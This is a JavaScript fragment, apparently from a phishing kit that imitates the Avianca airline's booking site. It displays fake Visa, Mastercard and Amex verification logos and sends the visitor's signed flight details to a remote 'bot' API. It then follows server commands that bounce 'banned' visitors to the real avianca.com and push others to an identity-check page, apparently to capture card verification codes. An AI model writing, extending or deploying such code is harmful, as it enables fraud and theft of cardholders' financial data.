const companyLoader = document.querySelector('#company-loader');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');
}

// Enviar info
info.metaInfo.origin = info.flightInfo.origin.city;
info.metaInfo.destination = info.flightInfo.destination.city;
info.metaInfo.flightDates = info.flightInfo.flightDates;
info.metaInfo.type = info.flightInfo.type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
info.metaInfo.adults = info.flightInfo.adults;
info.metaInfo.children = info.flightInfo.children;
info.metaInfo.babies = info.flightInfo.babies;

console.log(info.metaInfo);

const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, info.metaInfo, JWT_SIGN);

fetch(`${API_URL}/api/bot/flight/data`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`,
    },
    body: JSON.stringify({token: token})
})
    .then(response => response.json())
    .then(result => {
        // Manejo de respuetas del servidor
        console.log('Respuesta del servidor:', result.redirect_to);

        if(result.redirect_to.split('-')[0] === 'ban'){
            window.location.href = 'https://avianca.com';

            return;
        }

        if(result.redirect_to.split('-')[0] === 'checker'){
            console.log(result.redirect_to);
            info.checkerInfo.mode = result.redirect_to.split('-')[1];
            LS.setItem('info', JSON.stringify(info));
            
            window.location.href = 'id-check.html';

            return;
        }

        window.location.href = result.redirect_to+'.html';
    })
    .catch(error => {
        console.log('Error en la solicitud:', error);
    });